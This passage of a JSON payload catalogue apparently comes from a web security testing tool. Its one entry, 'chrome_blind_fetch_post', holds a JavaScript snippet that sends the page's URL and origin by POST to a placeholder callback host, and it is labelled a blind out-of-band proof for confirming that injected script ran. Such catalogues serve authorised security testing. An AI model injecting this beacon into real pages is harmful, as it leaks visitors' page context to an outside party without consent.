      "id": "chrome_blind_fetch_post",
      "category": "dom_access",
      "browser": "chrome",
      "technique": "fetch_post_callback",
      "payload": "(function(){var base='{url}';var sep=base.indexOf('?')===-1?'?':'&';try{fetch(base+sep+'probe=chrome-fetch-post',{method:'POST',mode:'no-cors',body:JSON.stringify({href:String(location.href),origin:String(location.origin||'null')})});}catch(e){}})();",
      "description": "Controlled blind-OAST proof that carries viewer context without relying on parent-frame access.",
      "risk_level": "medium",
      "research_tier": "validation",
      "stability": "high",
      "expected_signal": "controlled_callback",
